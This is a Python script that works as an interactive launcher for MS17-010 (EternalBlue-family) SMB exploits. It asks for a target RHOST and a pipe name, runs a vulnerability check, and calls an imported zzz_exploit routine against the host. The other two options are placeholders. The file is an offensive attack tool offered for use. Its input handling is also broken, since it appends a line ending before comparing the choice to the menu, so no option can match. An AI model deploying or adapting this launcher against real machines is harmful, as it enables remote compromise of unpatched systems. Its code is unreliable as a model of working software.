import MS17_010

def listExploits():
    l = ["zzz_exploit","eternalblue_exploit7","eternalblue_exploit8"]
    print("Exploits: \n")
    for e in l:
        print(e)
    print("")

    while True:
        try:
            message = input("EXP").split("\n")[0]
            # end shell mode
            if message == "exit":
                break
            message = message + "\r\n"
            if len(message) != 0:
                if message in l:
                    # No valid inputs = 4
                    value = 4
                    if message == "zzz_exploit":
                        value = Ezzz_exploit()
                    if message == "eternalblue_exploit7":
                        value = Eeternalblue_exploit7()
                    if message == "eternalblue_exploit8":
                        value = Eeternalblue_exploit8()

                    if value == 1:
                        return 1
                    else:
                        continue

        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            return
        except:
            # todo - errors
            print("Error at listExploits()")
            return -1

"""

1 = OK
2 = NOPE
3 = Error 
"""
def Ezzz_exploit():
    print("* Required")
    print("")
    RHOST = input("*RHOST").split("\n")[0]
    PIPE_NAME = input("PIPE_NAME").split("\n")[0]
    try:
        if len(PIPE_NAME) < 2:
            PIPE_NAME = ""
        print("Checking ...")
        if MS17_010.checker.check(RHOST):
            print("Exploiting ...")
            MS17_010.zzz_exploit.exploit(RHOST,PIPE_NAME)
            return 1
        else:
            return 2
    except:
        return 3

def Eeternalblue_exploit7():
    print("Soon ..")
    return 2

def Eeternalblue_exploit8():
    print("Soon ..")
    return 2
